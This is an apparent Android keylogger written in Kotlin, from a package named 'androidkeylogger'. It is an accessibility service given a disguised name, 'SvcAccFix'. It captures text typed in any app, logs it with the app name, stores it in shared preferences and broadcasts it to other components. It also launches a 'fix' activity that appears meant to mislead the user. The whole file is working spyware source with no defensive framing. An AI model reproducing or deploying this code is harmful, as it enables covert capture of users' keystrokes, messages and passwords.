package com.azamovhudstc.androidkeylogger

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.text.format.DateFormat
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import java.io.File
import java.io.FileOutputStream
import java.io.OutputStreamWriter
import java.text.SimpleDateFormat
import java.util.*

class SvcAccFix : AccessibilityService() {
    companion object {
        var i = false
        var j = false

    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val sharedPref = getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
            val packageName = event.packageName?.toString() ?: ""
            val beforeText = event.beforeText?.toString() ?: "str"
            Log.d(
                "EVENT",
                "onAccessibilityEvent: $packageName  BeforeText $beforeText "
            )
            Log.d("EVENT", "onAccessibilityEvent: ")
            sharedPref.edit().putString("text", beforeText).apply()
            sendBroadcast(beforeText)
        } else if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {

            Log.d("EVENT", "onAccessibilityEvent: ")

        }

    }

    private fun formatDate(): String {
        return try {
            SimpleDateFormat("yyyyMMdd", Locale.getDefault()).format(Calendar.getInstance().time)
        } catch (unused: Exception) {
            ""
        }
    }

    override fun onInterrupt() {}
    override fun onServiceConnected() {
        super.onServiceConnected()
        i = true
        if (j) {
            j = false
            val intent = Intent(this, AccessibilityFixActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            startActivity(intent)
        }
    }

    private fun sendBroadcast(text: String) {
        val intent = Intent("ACTION_TEXT_RECEIVED").apply {
            putExtra("TEXT", text)
        }
        sendBroadcast(intent)
    }
}
